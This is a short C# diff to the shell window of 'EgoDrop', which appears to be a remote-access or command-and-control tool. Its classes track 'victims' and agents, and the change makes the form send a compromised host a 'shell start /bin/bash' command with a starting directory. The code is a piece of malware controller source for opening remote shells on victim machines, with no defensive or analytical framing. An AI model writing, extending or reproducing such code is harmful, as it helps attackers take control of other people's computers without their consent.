@@ -12,15 +12,22 @@ namespace EgoDrop
 {
     public partial class frmShell : Form
     {
+        private clsAgent m_agent { get; init; }
         private clsVictim m_victim { get; init; }
         private string m_szVictimID { get; init; }
+        private string m_szInitDir { get; init; }
 
-        public frmShell(clsVictim victim, string szVictimID)
+        public frmShell(clsAgent agent, string szInitDir = ".")
         {
             InitializeComponent();
 
-            m_victim = victim;
-            m_szVictimID = szVictimID;
+            m_agent = agent;
+            m_victim = agent.m_victim;
+            m_szVictimID = agent.m_szVictimID;
+
+            m_szInitDir = szInitDir;
+
+            Text = $"Shell | {agent.m_szUriName}";
         }
 
         void fnRecv(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
@@ -88,7 +95,11 @@ namespace EgoDrop
             {
                 "shell",
                 "start",
+                "/bin/bash",
+                m_szInitDir,
             });
+
+            textBox1.Text = "/bin/bash";
         }
 
         private void frmShell_Load(object sender, EventArgs e)
